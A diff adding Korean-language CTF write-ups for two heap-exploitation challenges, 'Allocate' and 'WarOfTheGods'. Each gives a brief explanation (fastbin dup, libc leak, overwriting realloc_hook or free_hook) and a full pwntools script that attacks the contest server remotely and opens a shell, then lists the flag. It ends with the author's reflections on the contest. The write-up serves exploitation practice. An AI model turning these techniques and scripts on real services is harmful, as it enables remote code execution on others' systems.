@@ -450,6 +450,347 @@ malloc 를 할당하고 해제할때
           malloc_list[idx] = 0LL;
         ++dword_203044;
 ```
+초기화를 한번 안해서 fastbin dup를 사용할 수 있다.
+릭은 realloc을 사용해서 unsortedbin을 만들어서 립씨를 읽었고
+realloc_hook을 덮은다음 쉘을 땃다.
+
+```python
+from yeonnic import *
+
+context.arch="amd64"
+elf=ELF("./Allocate")
+libc=ELF("./libc.so.6")
+
+#p=process("./Allocate")
+p=remote("222.110.147.52",28417)
+def allocate_enter():
+    time.sleep(0.1)
+    p.sendline("1")
+    time.sleep(0.2)
+    print p.recv()
+def allocate_exit():
+    time.sleep(0.1)
+    p.sendline("6")
+    time.sleep(0.2)
+    print p.recv()
+def calloc(size, data):
+    time.sleep(0.1)
+    p.sendline("2")
+    print p.recv()
+    time.sleep(0.1)
+    p.sendline(str(size))
+    print p.recv()
+    time.sleep(0.2)
+    p.sendline(data)
+    print p.recv()
+def malloc(size, data):
+    time.sleep(0.1)
+    p.sendline("1")
+    print p.recv()
+    p.sendline(str(size))
+    time.sleep(0.2)
+    print p.recv()
+    time.sleep(0.2)
+    p.sendline(data)
+
+def free_enter():
+    
+    time.sleep(0.1)
+    p.sendline("1222")
+    time.sleep(0.2)
+    print p.recv()
+def calloc_free(idx):
+    free_enter()
+    time.sleep(0.1)
+    p.sendline("2")
+    print p.recv()
+    p.sendline(str(idx))
+    time.sleep(0.2)
+    print p.recv()
+def malloc_free(idx):
+    free_enter()
+    time.sleep(0.1)
+    p.sendline("1")
+    print p.recv()
+    time.sleep(0.1)
+    p.sendline(str(idx))
+    time.sleep(0.2)
+    print p.recv()
+
+allocate_enter()
+malloc(0x68,"AAAA")
+malloc(0x68,"AAAA")
+malloc(0x68,"AAAA")
+calloc(0x80,"BBB")
+calloc(0x80,"BBB")
+allocate_exit()
 
 
+allocate_enter()
+p.sendline("3")
+print p.recv()
+p.sendline(str(0x100))
+print p.recv()
+p.sendline("2")
+print p.recv()
+p.sendline("0")
+print p.recv()
+p.sendline("ls;sh")
+print p.recv()
+calloc(0x80,"A"*6+"B")
+allocate_exit()
+p.sendline("3")
+p.recvuntil("AB\n")
+libc_base=u64(p.recv(6)+"\x00\x00")-0x3c4b78
+print p.recv()
+target=libc_base+0x3c4aed
+one_shot=libc_base+0x4526a
+system=libc_base+libc.symbols['system']
+stderr=libc_base+libc.symbols['_IO_2_1_stderr_']
+stdout=libc_base+libc.symbols['_IO_2_1_stdout_']
+stdin=libc_base+libc.symbols['_IO_2_1_stdin_']
 
+print "libc base -> ",hex(libc_base)
+
+malloc_free(0)
+malloc_free(1)
+malloc_free(0)
+allocate_enter()
+malloc(0x68,p64(target))
+malloc(0x68,p64(target))
+malloc(0x68,p64(target))
+malloc(0x68,"ASD"+flat(system,system,system))
+
+gdb_pie_attach(p,[0x1d68, 0x1c83])
+#malloc(0x68,"ASD"+flat(0,0,0,0,0,libc_base+0x3c56e0,stderr,stdout,stdin,one_shot,one_shot))
+
+#calloc(next(libc.search("/bin/sh\x00"))+libc_base,"")
+
+p.interactive()
+```
+
+flag = FLAG{S0lo_Att4cks_the_H3ap_during_Chr1s7mas}
+
+
+## WarOfTheGods 991pt (pwn)
+```
+Can you win?
+nc 222.110.147.52:5265
+HINT1: fastbin dup into stack
+```
+
+데미갓을 딜리트할때 god name도 같이 해제하는대 이때 uaf가 발생한다.
+이걸 이용해서 립씨를 릭하고 fastbin dup를 이용해서 god name포인터를 free_hook주소로 덮어쓰고 쉘을 획득했다.
+
+```python
+from yeonnic import *
+
+elf=ELF("./WarOfTheGods")
+libc=ELF("./libc.so.6")
+
+#p=process("./WarOfTheGods")
+p=remote("222.110.147.52",5265)
+
+print p.recv()
+p.sendline("1")
+print p.recv()
+p.sendline("2")
+print p.recv()
+p.sendline("1")
+print p.recv()
+for i in range(4):
+    p.sendline(p32(0x41))
+    print p.recv()
+p.sendline(str(0x400))
+print p.recv()
+p.sendline(p32(0x41)*32)
+print p.recv()
+p.sendline("1")
+print p.recv()
+p.sendline("5")
+print p.recv()
+
+p.sendline("1")
+print p.recv()
+p.sendline("1")
+print p.recv()
+p.sendline("8")
+print p.recv()
+p.sendline(p32(0x41))
+print p.recv()
+p.sendline("2")
+print p.recv()
+p.sendline("20")
+print p.recv()
+p.sendline("15")
+print p.recv()
+p.sendline("3")
+print p.recv()
+p.sendline("5")
+print p.recv()
+
+
+p.sendline("3")
+print p.recv()
+p.sendline("1")
+print p.recv()
+p.sendline("4")
+print p.recv()
+p.sendline("4")
+print p.recv()
+p.sendline(str(0x10))
+print p.recv()
+p.sendline(p32(0x41))
+print p.recv()
+p.sendline(p32(0x41))
+print p.recv()
+
+p.sendline("3")
+print p.recv()
+p.sendline("2")
+print p.recv()
+p.sendline("0")
+print p.recv()
+p.sendline("5")
+print p.recv()
+p.sendline("1")
+print p.recv()
+p.sendline("2")
+print p.recv()
+p.sendline("3")
+print p.recvuntil("GOD Index: 4\nGOD Name: ")
+libc_base=u32(p.recv(4))-0x1b27b0
+heap_base=u32(p.recv(4))-0x818
+target=heap_base+0x344
+free_hook_3=libc_base+0x1b38b0
+system=libc_base+libc.symbols['system']
+print 'libc_base -> ',hex(libc_base)
+print 'heap_base -> ',hex(heap_base)
+time.sleep(0.2)
+print p.recv()
+raw_input()
+for i in range(3):
+    p.sendline("1")
+    print p.recv()
+    p.sendline(str(0x3c))
+    time.sleep(0.2)
+    print p.recv()
+    p.sendline(p32(0x41))
+    print p.recv()
+    p.sendline(p32(0x41))
+    print p.recv()
+
+p.sendline("5")
+print p.recv()
+p.sendline("1")
+print p.recv()
+p.sendline("1")
+print p.recv()
+p.sendline("8")
+time.sleep(0.2)
+print p.recv()
+p.sendline(p32(0x41))
+print p.recv()
+p.sendline("2")
+print p.recv()
+p.sendline("20")
+print p.recv()
+p.sendline("15")
+print p.recv()
+p.sendline("3")
+print p.recv()
+p.sendline("5")
+time.sleep(0.2)
+print p.recv()
+
+p.sendline("3")
+print p.recv()
+p.sendline("1")
+print p.recv()
+p.sendline("5")
+print p.recv()
+p.sendline("5")
+print p.recv()
+p.sendline(str(0x10))
+print p.recv()
+p.sendline(p32(0x41))
+print p.recv()
+p.sendline(p32(0x41))
+print p.recv()
+
+p.sendline("3")
+print p.recv()
+p.sendline("2")
+print p.recv()
+p.sendline("0")
+print p.recv()
+p.sendline("5")
+print p.recv()
+
+p.sendline("1")
+print p.recv()
+p.sendline("2")
+print p.recv()
+p.sendline("3")
+print p.recv()
+p.sendline("2")
+time.sleep(0.2)
+print p.recv()
+p.sendline("6")
+print p.recv()
+p.sendline("2")
+print p.recv()
+p.sendline("5")
+print p.recv()
+
+
+for i in range(3):
+    p.sendline("1")
+    print p.recv()
+    p.sendline(str(0x3c))
+    print p.recv()
+    p.sendline(p32(target))
+    print p.recv()
+    p.sendline(p32(0x41))
+    print p.recv()
+p.sendline("1")
+print p.recv()
+p.sendline(str(0x3c))
+print p.recv()
+p.sendline(flat(0,0x39,free_hook_3,free_hook_3,0x100,8,8))
+print p.recv()
+p.sendline(p32(0x41))
+print p.recv()
+p.sendline("5")
+print p.recv()
+p.sendline("1")
+print p.recv()
+gdb_pie_attach(p,[0x8ae,0x3b91,0xde6,0x18ce], "\ntracemalloc on\nheapinfoall\n")
+p.sendline("3")
+print p.recv()
+p.sendline("4")
+print p.recv()
+p.sendline("5")
+print p.recv()
+p.sendline(p32(system)+";sh\x00")
+print p.recv()
+p.sendline("1")
+print p.recv()
+p.sendline("3")
+print p.recv()
+p.sendline("2")
+print p.recv()
+p.sendline("5")
+
+
+print 'libc_base -> ',hex(libc_base)
+print 'heap_base -> ',hex(heap_base)
+
+p.interactive()
+```
+
+flag = FLAG{E@sy_I5_it_3asy?_It_is_ea5y_!!}
+
+## 후기
+마지막에 hs_club를 로컬에서는 쉘을 획득했지만 서버에서 IO문제 때문에 고생하다가 대회가 끝나버려서 좀 아쉽다...(포너블 올킬 가능했는대 ㅠㅠㅠㅠ)
+포너블충이라 다른문제들은 못풀줄 알았는데 생각보다 어렵지않고 퀄리티가 좋아서 재밌게 풀었습니다.
